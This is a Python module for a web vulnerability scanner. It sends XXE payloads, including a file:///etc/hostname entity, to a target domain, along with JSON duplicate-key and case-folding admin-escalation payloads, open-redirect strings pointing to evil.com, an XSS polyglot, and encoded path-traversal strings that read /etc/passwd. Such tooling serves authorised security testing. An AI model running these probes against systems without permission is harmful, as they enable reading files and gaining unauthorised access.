#!/usr/bin/env python3
"""
Parser Differential & XXE Detection Module
==========================================
Based on 2025 techniques including:
- JSON case sensitivity issues (Go)
- URL parser differentials
- XML External Entity (XXE) variants
- WHATWG parser edge cases
- Polyglot exploitation
- Path normalization issues

References:
- Parser differential research
- libxml2 XXE techniques
- Multi-parser confusion attacks
"""

import re
import json
import random
import string
from typing import List, Optional, Dict, Tuple
from urllib.parse import urlparse, urljoin, quote

from .base import TechniqueScanner, Finding, ScanProgress, is_shutdown


class ParserXXE(TechniqueScanner):
    """Parser Differential and XXE vulnerability scanner"""

    TECHNIQUE_NAME = "parser_xxe"
    TECHNIQUE_CATEGORY = "injection"

    # XXE payloads (non-destructive detection)
    XXE_PAYLOADS = [
        # Basic XXE detection
        {
            "name": "Basic DTD Entity",
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "XXE_DETECTED">]><root>&xxe;</root>',
            "detect": "XXE_DETECTED",
            "content_type": "application/xml"
        },
        # Parameter entity (blind detection preparation)
        {
            "name": "Parameter Entity",
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/hostname">%xxe;]><root>test</root>',
            "detect": "error",
            "content_type": "application/xml"
        },
        # SVG XXE
        {
            "name": "SVG XXE",
            "payload": '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe "XXE_DETECTED">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
            "detect": "XXE_DETECTED",
            "content_type": "image/svg+xml"
        },
        # XLSX/Office document structure
        {
            "name": "Office XML",
            "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "XXE_DETECTED">]><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Target="&xxe;"/></Relationships>',
            "detect": "XXE_DETECTED",
            "content_type": "application/xml"
        },
        # SOAP XXE
        {
            "name": "SOAP XXE",
            "payload": '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe "XXE_DETECTED">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body><test>&xxe;</test></soap:Body>
</soap:Envelope>''',
            "detect": "XXE_DETECTED",
            "content_type": "text/xml"
        },
    ]

    # JSON parser differential payloads
    JSON_PAYLOADS = [
        # Case sensitivity test (Go vulnerability)
        {
            "name": "Case Insensitive Key",
            "payloads": [
                '{"admin": false, "Admin": true}',
                '{"ADMIN": true, "admin": false}',
            ],
            "description": "Go's JSON decoder is case-insensitive"
        },
        # Duplicate keys
        {
            "name": "Duplicate Keys",
            "payloads": [
                '{"role": "user", "role": "admin"}',
            ],
            "description": "Different parsers handle duplicate keys differently"
        },
        # Unicode escapes
        {
            "name": "Unicode Escape",
            "payloads": [
                '{"\\u0061dmin": true}',  # \u0061 = 'a'
            ],
            "description": "Unicode escape handling differences"
        },
        # Comments in JSON
        {
            "name": "JSON Comments",
            "payloads": [
                '{"admin": false /* comment */, "role": "user"}',
                '{"admin": false // comment\n, "role": "user"}',
            ],
            "description": "Some parsers accept comments in JSON"
        },
    ]

    # URL parser differential tests
    URL_PARSER_TESTS = [
        # Backslash normalization
        ("https://example.com\\@evil.com", "backslash_confusion"),
        # Port confusion
        ("https://example.com:443@evil.com", "port_userinfo"),
        # IPv6 confusion
        ("https://[::1]@evil.com", "ipv6_userinfo"),
        # Null byte
        ("https://example.com%00.evil.com", "null_byte"),
        # Tab/newline
        ("https://example.com%09.evil.com", "tab_byte"),
        # Fragment confusion
        ("https://example.com#@evil.com", "fragment_at"),
        # Double slash
        ("https://example.com//evil.com", "double_slash"),
    ]

    # Content type confusion endpoints
    CONTENT_ENDPOINTS = [
        "/api/upload",
        "/api/import",
        "/upload",
        "/import",
        "/api/parse",
        "/api/convert",
        "/webhook",
    ]

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.canary = self._generate_canary()

    def _generate_canary(self) -> str:
        """Generate unique canary for detection"""
        return 'parse' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

    def _find_xml_endpoints(self, domain: str) -> List[Dict]:
        """Find endpoints that accept XML input"""
        xml_endpoints = []

        # Common XML-accepting endpoints
        test_endpoints = [
            "/api/xml",
            "/api/import",
            "/api/upload",
            "/soap",
            "/wsdl",
            "/xmlrpc",
            "/xmlrpc.php",
            "/api/webhook",
            "/api/callback",
            "/api/parse",
        ]

        for endpoint in test_endpoints:
            if is_shutdown():
                break

            url = f"https://{domain}{endpoint}"

            # Test with XML content type
            xml_data = '<?xml version="1.0"?><test>data</test>'
            resp = self.post(url,
                            data=xml_data,
                            headers={"Content-Type": "application/xml"})

            if resp and resp.status_code not in [404, 405]:
                xml_endpoints.append({
                    "url": url,
                    "endpoint": endpoint,
                    "status": resp.status_code,
                    "accepts_xml": True
                })

            # Also test for SVG upload
            if 'upload' in endpoint.lower():
                svg_data = '<svg xmlns="http://www.w3.org/2000/svg"><text>test</text></svg>'
                resp_svg = self.post(url,
                                    data=svg_data,
                                    headers={"Content-Type": "image/svg+xml"})

                if resp_svg and resp_svg.status_code not in [404, 405]:
                    xml_endpoints.append({
                        "url": url,
                        "endpoint": endpoint,
                        "status": resp_svg.status_code,
                        "accepts_svg": True
                    })

        return xml_endpoints

    def _test_xxe(self, domain: str, endpoint: Dict) -> List[Dict]:
        """Test XXE payloads against an endpoint"""
        findings = []
        url = endpoint["url"]

        for xxe in self.XXE_PAYLOADS:
            if is_shutdown():
                break

            # Match content type
            if endpoint.get("accepts_svg") and xxe["content_type"] != "image/svg+xml":
                continue
            if not endpoint.get("accepts_svg") and xxe["content_type"] == "image/svg+xml":
                continue

            resp = self.post(url,
                            data=xxe["payload"],
                            headers={"Content-Type": xxe["content_type"]})

            if resp is None:
                continue

            # Check for XXE indicators
            response_text = resp.text.lower()

            # Direct detection
            if xxe["detect"].lower() in response_text:
                findings.append({
                    "type": "xxe_confirmed",
                    "name": xxe["name"],
                    "url": url,
                    "payload": xxe["payload"],
                    "evidence": f"XXE payload reflected: {xxe['detect']}"
                })

            # Error-based detection
            elif xxe["detect"] == "error" and any(err in response_text for err in
                ["entity", "dtd", "external", "system", "file://", "parser error"]):
                findings.append({
                    "type": "xxe_error",
                    "name": xxe["name"],
                    "url": url,
                    "payload": xxe["payload"],
                    "evidence": f"XML parser error suggests XXE processing: {resp.text[:200]}"
                })

            # Timing-based detection (blind XXE indicator)
            elif resp.elapsed.total_seconds() > 5:
                findings.append({
                    "type": "xxe_timing",
                    "name": xxe["name"],
                    "url": url,
                    "payload": xxe["payload"],
                    "evidence": f"Unusual response time ({resp.elapsed.total_seconds():.1f}s) suggests external entity fetch"
                })

        return findings

    def _find_json_endpoints(self, domain: str) -> List[str]:
        """Find endpoints that accept JSON input"""
        json_endpoints = []

        test_endpoints = [
            "/api/",
            "/api/user",
            "/api/users",
            "/api/login",
            "/api/auth",
            "/api/data",
            "/api/v1/",
            "/graphql",
        ]

        for endpoint in test_endpoints:
            if is_shutdown():
                break

            url = f"https://{domain}{endpoint}"
            json_data = '{"test": "data"}'

            resp = self.post(url,
                            data=json_data,
                            headers={"Content-Type": "application/json"})

            if resp and resp.status_code not in [404]:
                json_endpoints.append(url)

        return json_endpoints

    def _test_json_parser_differential(self, domain: str, endpoint: str) -> List[Dict]:
        """Test for JSON parser differential vulnerabilities"""
        findings = []

        for test in self.JSON_PAYLOADS:
            if is_shutdown():
                break

            for payload in test["payloads"]:
                resp = self.post(endpoint,
                                data=payload,
                                headers={"Content-Type": "application/json"})

                if resp is None:
                    continue

                # Check for successful parsing (not a parse error)
                if resp.status_code == 200:
                    findings.append({
                        "type": "json_parser_quirk",
                        "name": test["name"],
                        "url": endpoint,
                        "payload": payload,
                        "description": test["description"],
                        "evidence": f"JSON payload accepted: {test['name']}"
                    })
                    break  # Found one that works

        return findings

    def _test_url_parser_differential(self, domain: str) -> List[Dict]:
        """Test for URL parser differential vulnerabilities"""
        findings = []

        # Find redirect endpoints to test
        redirect_params = ["redirect", "url", "next", "return", "goto"]
        base_paths = ["/", "/login", "/auth/callback"]

        for base_path in base_paths:
            for param in redirect_params[:3]:
                if is_shutdown():
                    break

                for test_url, vuln_type in self.URL_PARSER_TESTS:
                    test_full = f"https://{domain}{base_path}?{param}={quote(test_url, safe='')}"

                    resp = self.get(test_full, allow_redirects=False)
                    if resp is None:
                        continue

                    if resp.status_code in [301, 302, 303, 307, 308]:
                        location = resp.headers.get('Location', '')

                        # Check if evil.com ended up in the location
                        if 'evil.com' in location:
                            findings.append({
                                "type": "url_parser_confusion",
                                "vuln_type": vuln_type,
                                "original_url": test_url,
                                "location": location,
                                "evidence": f"URL parser confusion ({vuln_type}): redirected to {location}"
                            })

        return findings

    def _test_content_type_confusion(self, domain: str) -> List[Dict]:
        """Test for content type confusion/polyglot attacks"""
        findings = []

        # Polyglot payloads
        polyglots = [
            # JSON/JavaScript polyglot
            {
                "name": "JSON-JS Polyglot",
                "data": '{"x":"<script>alert(1)</script>"}',
                "types": ["application/json", "text/html"]
            },
            # XML/HTML polyglot
            {
                "name": "XML-HTML Polyglot",
                "data": '<html><body><!--<?xml version="1.0"?><test></test>--></body></html>',
                "types": ["application/xml", "text/html"]
            },
        ]

        for endpoint in self.CONTENT_ENDPOINTS[:3]:
            if is_shutdown():
                break

            url = f"https://{domain}{endpoint}"

            for polyglot in polyglots:
                for content_type in polyglot["types"]:
                    resp = self.post(url,
                                    data=polyglot["data"],
                                    headers={"Content-Type": content_type})

                    if resp and resp.status_code == 200:
                        # Check if response varies by content type
                        findings.append({
                            "type": "content_type_accepted",
                            "name": polyglot["name"],
                            "url": url,
                            "content_type": content_type,
                            "evidence": f"Endpoint accepts {content_type} content"
                        })

        return findings

    def _test_path_traversal_parsers(self, domain: str) -> List[Dict]:
        """Test for path traversal via parser differentials"""
        findings = []

        # Path traversal patterns
        traversal_patterns = [
            ("../../../etc/passwd", "basic_traversal"),
            ("..%2f..%2f..%2fetc%2fpasswd", "url_encoded"),
            ("..%252f..%252f..%252fetc%252fpasswd", "double_encoded"),
            ("....//....//....//etc/passwd", "filter_bypass"),
            ("..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "unicode_bypass"),
            ("..\\..\\..\\etc\\passwd", "backslash"),
        ]

        # Test on file-like endpoints
        file_endpoints = [
            "/api/file?path=",
            "/api/read?file=",
            "/download?filename=",
            "/static/",
            "/assets/",
        ]

        for endpoint in file_endpoints:
            if is_shutdown():
                break

            for pattern, pattern_type in traversal_patterns:
                url = f"https://{domain}{endpoint}{quote(pattern)}"

                resp = self.get(url)
                if resp is None:
                    continue

                # Check for traversal success indicators
                if resp.status_code == 200:
                    content = resp.text.lower()
                    if any(ind in content for ind in ['root:', 'bin:', 'nobody:', '/bin/bash']):
                        findings.append({
                            "type": "path_traversal",
                            "pattern_type": pattern_type,
                            "url": url,
                            "evidence": f"Path traversal successful: {pattern_type}"
                        })

        return findings

    def scan(self, domain: str, progress: ScanProgress) -> List[Finding]:
        """Scan domain for parser and XXE vulnerabilities"""
        findings = []
        self.log(f"Testing parser/XXE on {domain}")

        # Find and test XML endpoints
        self.log("Finding XML endpoints")
        xml_endpoints = self._find_xml_endpoints(domain)

        if xml_endpoints:
            self.log(f"Found {len(xml_endpoints)} XML endpoints", "success")

            for endpoint in xml_endpoints:
                finding = self.create_finding(
                    domain=domain,
                    severity="info",
                    title=f"XML Endpoint: {endpoint['endpoint']}",
                    description=f"Endpoint accepts XML content",
                    evidence=f"Status: {endpoint['status']}",
                    reproduction_steps=[
                        f"POST XML to: {endpoint['url']}",
                        "Content-Type: application/xml"
                    ]
                )
                findings.append(finding)
                progress.add_finding(domain, finding)

                # Test XXE
                xxe_findings = self._test_xxe(domain, endpoint)
                for xf in xxe_findings:
                    severity = "critical" if xf["type"] == "xxe_confirmed" else "high"
                    finding = self.create_finding(
                        domain=domain,
                        severity=severity,
                        title=f"XXE: {xf['name']}",
                        description=f"XML External Entity injection detected",
                        evidence=xf["evidence"],
                        reproduction_steps=[
                            f"URL: {xf['url']}",
                            f"Payload: {xf['payload'][:200]}"
                        ],
                        request=xf["payload"]
                    )
                    findings.append(finding)
                    progress.add_finding(domain, finding)

        # Find and test JSON endpoints
        if not is_shutdown():
            self.log("Finding JSON endpoints")
            json_endpoints = self._find_json_endpoints(domain)

            for endpoint in json_endpoints:
                json_findings = self._test_json_parser_differential(domain, endpoint)

                for jf in json_findings:
                    finding = self.create_finding(
                        domain=domain,
                        severity="medium",
                        title=f"JSON Parser Quirk: {jf['name']}",
                        description=jf["description"],
                        evidence=jf["evidence"],
                        reproduction_steps=[
                            f"URL: {jf['url']}",
                            f"Payload: {jf['payload']}"
                        ]
                    )
                    findings.append(finding)
                    progress.add_finding(domain, finding)

        # Test URL parser differentials
        if not is_shutdown():
            self.log("Testing URL parser differentials")
            url_findings = self._test_url_parser_differential(domain)

            for uf in url_findings:
                finding = self.create_finding(
                    domain=domain,
                    severity="high",
                    title=f"URL Parser Confusion: {uf['vuln_type']}",
                    description="URL parser handles malformed URL differently, allowing redirect bypass",
                    evidence=uf["evidence"],
                    reproduction_steps=[
                        f"Original URL: {uf['original_url']}",
                        f"Resulted in redirect to: {uf['location']}"
                    ]
                )
                findings.append(finding)
                progress.add_finding(domain, finding)

        # Test content type confusion
        if not is_shutdown():
            self.log("Testing content type confusion")
            ct_findings = self._test_content_type_confusion(domain)

            for ctf in ct_findings:
                finding = self.create_finding(
                    domain=domain,
                    severity="low",
                    title=f"Content Type Accepted: {ctf['name']}",
                    description="Endpoint accepts multiple content types - potential for polyglot attacks",
                    evidence=ctf["evidence"],
                    reproduction_steps=[
                        f"URL: {ctf['url']}",
                        f"Content-Type: {ctf['content_type']}"
                    ]
                )
                findings.append(finding)
                progress.add_finding(domain, finding)

        # Test path traversal via parser differentials
        if not is_shutdown():
            self.log("Testing path traversal patterns")
            pt_findings = self._test_path_traversal_parsers(domain)

            for ptf in pt_findings:
                finding = self.create_finding(
                    domain=domain,
                    severity="critical",
                    title=f"Path Traversal: {ptf['pattern_type']}",
                    description="Path traversal vulnerability via parser differential",
                    evidence=ptf["evidence"],
                    reproduction_steps=[
                        f"URL: {ptf['url']}"
                    ]
                )
                findings.append(finding)
                progress.add_finding(domain, finding)

        self.log(f"Completed: {len(findings)} parser/XXE issues found", "success" if findings else "info")
        return findings
